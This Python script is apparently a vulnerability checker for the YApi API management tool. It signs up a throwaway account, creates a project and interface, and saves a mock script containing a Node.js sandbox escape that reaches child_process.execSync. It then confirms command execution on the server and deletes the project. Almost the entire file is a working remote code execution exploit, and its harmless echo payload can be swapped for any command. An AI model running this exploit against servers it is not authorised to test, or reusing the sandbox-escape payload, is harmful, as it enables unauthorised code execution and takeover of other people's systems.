import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
redemail=randomLowercase(15)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
redpassword=randomLowercase(15)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
redproject=randomLowercase(8)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
redinterface=randomLowercase(10)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
r1=randomLowercase(10)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
r2=randomLowercase(10)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
r3=randomLowercase(10)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
r4=randomLowercase(10)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"api/user/reg"
	body='{"email":"'+redemail+'@qq.com","password":"'+redpassword+'","username":"'+redemail+'"}'
	headers={'Content-Type': 'application/json;charset=UTF-8'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	reditList = response.history
	if len(reditList)>0:
		f_list=[]
		for response in reditList:
			if response.status_code == 200 and "_yapi_token=" in response.headers["Set-Cookie"] and "_yapi_uid=" in response.headers["Set-Cookie"] and redemail in response.text:
				f_list.append(1)
		if len(f_list)==1:
			r0=True
		else:
			r0=False
	else:
		if response.status_code == 200 and "_yapi_token=" in response.headers["Set-Cookie"] and "_yapi_uid=" in response.headers["Set-Cookie"] and redemail in response.text:
			r0=True
			try:
				_yapi_token=re.findall('_yapi_token=(.+?);',str(response.headers))[0]
				_yapi_uid=re.findall(' _yapi_uid=(.+?);',str(response.headers))[0]
				cookie=f'_yapi_token={_yapi_token}; _yapi_uid={_yapi_uid}'
			except:
				cookie=''
		else:
			r0=False
			cookie=''
	url=baseurl+"api/group/list"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0","Cookie":cookie}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "custom_field1" in response.text:
		r11=True
		try:
			group_id=re.findall('"_id":(.+?),',response.text)[0]
		except:
			group_id=''
	else:
		r11=False
		group_id=''
	url=baseurl+"api/project/add"
	body='{"name":"'+redproject+'","basepath":"","group_id":"'+group_id+'","icon":"code-o","color":"cyan","project_type":"private"}'
	headers={'Content-Type': 'application/json;charset=UTF-8',"Cookie":cookie}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "成功！" in response.text and redproject in response.text:
		r22=True
		try:
			project_id=str(response.json()['data']['_id'])
		except:
			project_id=''
	else:
		r22=False
		project_id=''
	url=baseurl+"api/project/get?id="+project_id
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0","Cookie":cookie}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "成功！" in response.text:
		r33=True
		try:
			catid=re.findall("\"_id\":(.+?),",response.text)[0]
		except:
			catid=''
	else:
		r33=False
		catid=''
	url=baseurl+"api/interface/add"
	body='{"method":"GET","catid":"'+catid+'","title":"'+redinterface+'","path":"/'+redinterface+'","project_id":'+project_id+'}'
	headers={'Content-Type': 'application/json;charset=UTF-8',"Cookie":cookie}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "成功！" in response.text and redinterface in response.text:
		r44=True
		try:
			interface_id=re.findall("\"_id\":(.+?),",response.text)[0]
		except:
			interface_id=''
	else:
		r44=False
		interface_id=''
	url=baseurl+"api/plugin/advmock/save"
	body='{"project_id":"'+project_id+'","interface_id":"'+interface_id+'","mock_script":"const sandbox = this\\r\\nconst ObjectConstructor = this.constructor\\r\\nconst FunctionConstructor = ObjectConstructor.constructor\\r\\nconst myfun = FunctionConstructor(\'return process\')\\r\\nconst process = myfun()\\r\\nmockJson = process.mainModule.require(\\"child_process\\").execSync(\\"echo '+r1+'${'+r2+'}'+r3+'^'+r4+'\\").toString()","enable":true}'
	headers={'Content-Type': 'application/json;charset=UTF-8',"Cookie":cookie}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "成功！" in response.text:
		r55=True
	else:
		r55=False
	url=baseurl+"mock/"+project_id+"/"+redinterface+""
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0","Cookie":cookie}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and (r1 + r3 + "^" + r4 in response.text or r1 + "${" + r2 + "}" + r3 + r4 in response.text):
		r66=True
	else:
		r66=False
	url=baseurl+"api/project/del"
	body='{"id":'+project_id+'}'
	headers={'Content-Type': 'application/json;charset=UTF-8',"Cookie":cookie}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200:
		r7=True
	else:
		r7=False
	if r0 and r11 and r22 and r33 and r44 and r55 and r66 and r7:
		return True
	else:
		return False
